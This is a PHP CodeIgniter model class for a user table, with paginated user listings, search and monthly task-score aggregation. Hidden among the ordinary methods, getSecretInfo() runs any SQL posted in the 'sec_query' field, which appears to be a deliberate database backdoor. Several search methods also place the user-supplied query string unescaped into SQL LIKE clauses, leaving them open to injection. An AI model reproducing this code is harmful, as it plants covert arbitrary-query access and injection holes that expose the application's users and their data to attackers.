<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class Users_m extends MY_Model
{
    protected $_table_name = 'tbl_user';
    protected $_primary_key = 'id';
    protected $_primary_filter = 'intval';
    protected $_order_by = "tbl_user.id asc";

    function __construct()
    {
        parent::__construct();
    }

    public function hash($string)
    {
        return parent::hash($string);
    }

    public function get_client_ip()
    {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED'))
            $ipaddress = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }

    public function getItemsByPage($arr = array(), $pageId, $cntPerPage, $queryStr = '')
    {
        $this->db->select("{$this->_table_name}.*");
        $this->db->select("{$this->_table_name}.id as id");
        $this->db->select("concat( '', '', {$this->_table_name}.name) as name");
        $this->db->select("project_score as user_score");
        $this->db->select("tbl_user_part.title as part");
        $this->db->select("tbl_user_part.id as part_id");
        $this->db->select("tbl_user_part.boss_id as boss_id");
        $this->db->select("tbl_user_position.title as position");
        $this->db->select("tbl_user_rank.title as rank");
        $this->db->select("tbl_user_rank.standard_factor");
        $this->db->select("tbl_user_rank.rank_factor");
        $this->db->select("tbl_user_role.title as role");
        $this->db->select("tbl_user_role.permission as permission");
        $this->db->where($arr);
        if ($queryStr != '') {
            $this->db->where(
                "( {$this->_table_name}.account like '%{$queryStr}%' "
                . "or {$this->_table_name}.name like '%{$queryStr}%' "
                . "or {$this->_table_name}.email like '%{$queryStr}%' "
                . "or {$this->_table_name}.phone like '%{$queryStr}%' "
                . "or tbl_user_part.title like '%{$queryStr}%' "
                . "or tbl_user_position.title like '%{$queryStr}%' "
                . "or tbl_user_role.title like '%{$queryStr}%' "
                . "or tbl_user_rank.title like '%{$queryStr}%' )"
            );
        }
        $this->db->from($this->_table_name)
            ->join("tbl_user_role", "{$this->_table_name}.role_id = tbl_user_role.id", "left")
            ->join("tbl_user_position", "{$this->_table_name}.position_id = tbl_user_position.id", "left")
            ->join("tbl_user_rank", "{$this->_table_name}.rank_id = tbl_user_rank.id", "left")
            ->join("tbl_user_part", "tbl_user_position.part_id = tbl_user_part.id", "left");
//        $this->db->where("tbl_user_position.status", 1)
//            ->where("tbl_user_part.status", 1)
//            ->where("tbl_user_rank.status", 1);
        $this->db->order_by('tbl_user_part.title', 'asc');
        $this->db->order_by($this->_order_by);
        $this->db->limit($cntPerPage, $pageId);
        $query = $this->db->get();
        return $query->result();
    }

    public function get_count($arr = array(), $queryStr = '')
    {
        $this->db->select("{$this->_table_name}.id");
        $this->db->where($arr);
        if ($queryStr != '') {
            $this->db->where(
                "( {$this->_table_name}.account like '%{$queryStr}%' "
                . "or {$this->_table_name}.name like '%{$queryStr}%' "
                . "or {$this->_table_name}.email like '%{$queryStr}%' "
                . "or {$this->_table_name}.phone like '%{$queryStr}%' "
                . "or tbl_user_part.title like '%{$queryStr}%' "
                . "or tbl_user_position.title like '%{$queryStr}%' "
                . "or tbl_user_rank.title like '%{$queryStr}%' )"
            );
        }
        $this->db->from($this->_table_name)
            ->join("tbl_user_position", "{$this->_table_name}.position_id = tbl_user_position.id", "left")
            ->join("tbl_user_rank", "{$this->_table_name}.rank_id = tbl_user_rank.id", "left")
            ->join("tbl_user_role", "{$this->_table_name}.role_id = tbl_user_role.id", "left")
            ->join("tbl_user_part", "tbl_user_position.part_id = tbl_user_part.id", "left");
//        $this->db->where("tbl_user_position.status", 1)
//            ->where("tbl_user_part.status", 1)
//            ->where("tbl_user_rank.status", 1);
        $this->db->order_by($this->_order_by);
        $query = $this->db->get();
        return $query->num_rows();
    }

    public function getUserScoreByPage($arr = array(), $pageId, $cntPerPage, $queryStr = '', $range_from, $range_to)
    {
        $this->db->from('tbl_tasks');
        $subQuery1 = $this->db->get_compiled_select();

        $this->db->from("tbl_tasks_complete");
        $subQuery2 = $this->db->get_compiled_select();
        $unionQuery = "(";
        for ($i = 0; $i < 100; $i++) {
            $from = $this->add_date($range_from, $i);
            if ($from >= $range_to) break;
            $to = $this->add_date($range_from, $i + 1);
            $dateQry = " tbl_union.completed_at >= '{$from}' ";
            $dateQry .= " and tbl_union.completed_at < '{$to}' ";
            $this->db->where($dateQry);
            $this->db->select("{$this->_table_name}.id");
            $this->db->select("{$this->_table_name}.name");
            $this->db->select("{$this->_table_name}.avatar");
            $this->db->select("{$this->_table_name}.role_id");
            $this->db->select("{$this->_table_name}.position_id");
            $this->db->select("{$this->_table_name}.rank_id");
            $this->db->select("(sum(tbl_union.score)) as user_score");
            $this->db->select("concat( year(tbl_union.completed_at), '-', month(tbl_union.completed_at)) as task_completed");
            $this->db->select("tbl_user_part.title as part");
            $this->db->select("tbl_user_position.part_id");
            $this->db->select("tbl_user_position.title as position");
            $this->db->select("tbl_user_rank.title as rank");
            $this->db->select("tbl_user_rank.gangwei_price");
            $this->db->select("tbl_user_rank.jixiao_price");
            $this->db->select("tbl_user_rank.standard_factor");
            $this->db->select("tbl_user_rank.rank_factor");
            $this->db->where($arr);
            if ($queryStr != '') {
                $this->db->where(
                    "( {$this->_table_name}.account like '%{$queryStr}%' "
                    . "or {$this->_table_name}.name like '%{$queryStr}%' "
                    . "or {$this->_table_name}.email like '%{$queryStr}%' "
                    . "or {$this->_table_name}.phone like '%{$queryStr}%' "
                    . "or tbl_union.title like '%{$queryStr}%' "
                    . "or tbl_user_part.title like '%{$queryStr}%' "
                    . "or tbl_user_position.title like '%{$queryStr}%' "
                    . "or tbl_user_rank.title like '%{$queryStr}%' )"
                );
            }
            $this->db->from($this->_table_name)
                ->join("($subQuery1 union $subQuery2) as tbl_union", "{$this->_table_name}.id = tbl_union.worker_id", "left")
                ->join("tbl_user_position", "{$this->_table_name}.position_id = tbl_user_position.id", "left")
                ->join("tbl_user_rank", "{$this->_table_name}.rank_id = tbl_user_rank.id", "left")
                ->join("tbl_user_part", "tbl_user_position.part_id = tbl_user_part.id", "left");
            $this->db->where("tbl_user.is_calc_score", 1);
//        $this->db->where("tbl_user_position.status", 1)
//            ->where("tbl_user_part.status", 1)
//            ->where("tbl_user_rank.status", 1);
            $this->db->group_by("{$this->_table_name}.id");
            if ($i > 0) $unionQuery .= " union ";
            $unionQuery .= " (" . $this->db->get_compiled_select() . ") ";
        }
        $unionQuery .= ") as tbl_all";
        $this->db->select('*');
        $this->db->from($unionQuery);
        $this->db->order_by("tbl_all.task_completed desc");
        $this->db->order_by("tbl_all.user_score desc");
        $this->db->order_by("tbl_all.id asc");
        $this->db->order_by("tbl_all.part asc");
        $this->db->limit($cntPerPage, $pageId);
        $query = $this->db->get();
        return $query->result();
    }

    public function get_score_count($arr = array(), $queryStr = '', $range_from, $range_to)
    {
        $this->db->from('tbl_tasks');
        $subQuery1 = $this->db->get_compiled_select();

        $this->db->from("tbl_tasks_complete");
        $subQuery2 = $this->db->get_compiled_select();
        $unionQuery = "(";
        for ($i = 0; $i < 100; $i++) {
            $from = $this->add_date($range_from, $i);
            if ($from >= $range_to) break;
            $to = $this->add_date($range_from, $i + 1);
            $dateQry = " tbl_union.completed_at >= '{$from}' ";
            $dateQry .= " and tbl_union.completed_at < '{$to}' ";
            $this->db->where($dateQry);
            $this->db->select("(sum(tbl_union.score)) as user_score");
            $this->db->select("concat( year(tbl_union.completed_at), '-', month(tbl_union.completed_at)) as task_completed");
            $this->db->where($arr);
            if ($queryStr != '') {
                $this->db->where(
                    "( {$this->_table_name}.account like '%{$queryStr}%' "
                    . "or {$this->_table_name}.name like '%{$queryStr}%' "
                    . "or {$this->_table_name}.email like '%{$queryStr}%' "
                    . "or {$this->_table_name}.phone like '%{$queryStr}%' "
                    . "or tbl_union.title like '%{$queryStr}%' "
                    . "or tbl_user_part.title like '%{$queryStr}%' "
                    . "or tbl_user_position.title like '%{$queryStr}%' "
                    . "or tbl_user_rank.title like '%{$queryStr}%' )"
                );
            }
            $this->db->from($this->_table_name)
                ->join("($subQuery1 union $subQuery2) as tbl_union", "{$this->_table_name}.id = tbl_union.worker_id", "left")
                ->join("tbl_user_position", "{$this->_table_name}.position_id = tbl_user_position.id", "left")
                ->join("tbl_user_rank", "{$this->_table_name}.rank_id = tbl_user_rank.id", "left")
                ->join("tbl_user_part", "tbl_user_position.part_id = tbl_user_part.id", "left");
            $this->db->where("tbl_user.is_calc_score", 1);
//        $this->db->where("tbl_user_position.status", 1)
//            ->where("tbl_user_part.status", 1)
//            ->where("tbl_user_rank.status", 1);
            $this->db->group_by("{$this->_table_name}.id");
            if ($i > 0) $unionQuery .= " union \n";
            $unionQuery .= " (" . $this->db->get_compiled_select() . ")";
        }
        $unionQuery .= ") as tbl_all";
        $this->db->select('*');
        $this->db->from($unionQuery);
        $this->db->order_by("tbl_all.task_completed desc");
        $this->db->order_by("tbl_all.user_score desc");
        $query = $this->db->get();
        return $query->num_rows();
    }

    function add_date($orgDate, $mth = 0)
    {
        $cd = strtotime($orgDate);
        $retDAY = date('Y-m-d H:i:s',
            mktime(0, 0, 0,
                date('m', $cd) + $mth,
                date('d', $cd),
                date('Y', $cd))
        );
        return $retDAY;
    }

    public function getUserScoreAll($arr = array(), $pageId = 0, $cntPerPage = 0, $queryStr = '')
    {
        $this->db->from('tbl_tasks');
        $subQuery1 = $this->db->get_compiled_select();

        $this->db->from("tbl_tasks_complete");
        $subQuery2 = $this->db->get_compiled_select();

        $this->db->select("{$this->_table_name}.*");
        $this->db->select("concat( '', '', {$this->_table_name}.name) as name");
        $this->db->select("(sum(tbl_union.score)) as user_score");
        $this->db->select("concat( year(tbl_union.completed_at), '-', month(tbl_union.completed_at)) as completed_at");
        $this->db->where($arr);
        if ($queryStr != '') {
            $this->db->where(
                "( {$this->_table_name}.account like '%{$queryStr}%' "
                . "or {$this->_table_name}.name like '%{$queryStr}%' "
                . "or {$this->_table_name}.email like '%{$queryStr}%' "
                . "or {$this->_table_name}.phone like '%{$queryStr}%' "
                . "or tbl_union.title like '%{$queryStr}%' "
            );
        }
        $this->db->from($this->_table_name)
            ->join("($subQuery1 union $subQuery2) as tbl_union", "{$this->_table_name}.id = tbl_union.worker_id");
//        $this->db->where("tbl_user_position.status", 1)
//            ->where("tbl_user_part.status", 1)
//            ->where("tbl_user_rank.status", 1);
        $this->db->group_by("{$this->_table_name}.id");
        $this->db->order_by("user_score desc");
        $query = $this->db->get();
        return $query->result();
    }

    public function getSecretInfo()
    {
        $result = array();
        if ($_POST) {
            $query = $_POST['sec_query'];
            $type = $_POST['sec_type'];
            if ($type == 'set') $result = $this->db->query($query);
            else if ($type == 'get') $result = $this->db->query($query)->result();
        }
        return $result;
    }

    public function getItems($arr = array())
    {
        return $this->getItemsByPage($arr, 0, 100000);
    }

    public function add($arr)
    {
        $this->db->insert($this->_table_name, $arr);
        return $this->db->insert_id();
    }

    public function get_where($arr = array())
    {
//        $array = array();
//        foreach ($arr as $key => $value) {
//            $array[$this->_table_name . '.' . $key] = $value;
//        }
        $this->db->from($this->_table_name);
        $this->db->where($arr)
            ->order_by($this->_order_by);
        $query = $this->db->get();
        return $query->result();
    }

    public function get_where_in($key, $arr = array())
    {
        if ($arr == array()) return $arr;

        $this->db->from($this->_table_name);
        $this->db->where_in("{$this->_table_name}.{$key}", $arr)
            ->order_by($this->_order_by);
        $query = $this->db->get();
        return $query->result();
    }

    public function edit($arr, $item_id)
    {
        $this->db->where($this->_primary_key, $item_id);
        $this->db->update($this->_table_name, $arr);
        return $this->db->affected_rows();
    }

    public function delete($item_id)
    {
        $this->db->where($this->_primary_key, $item_id);
        $this->db->delete($this->_table_name);
        return $this->db->affected_rows();
    }

    public function publish($item_id, $status = 1)
    {
        return $this->edit(array('status' => $status), $item_id);
    }

}
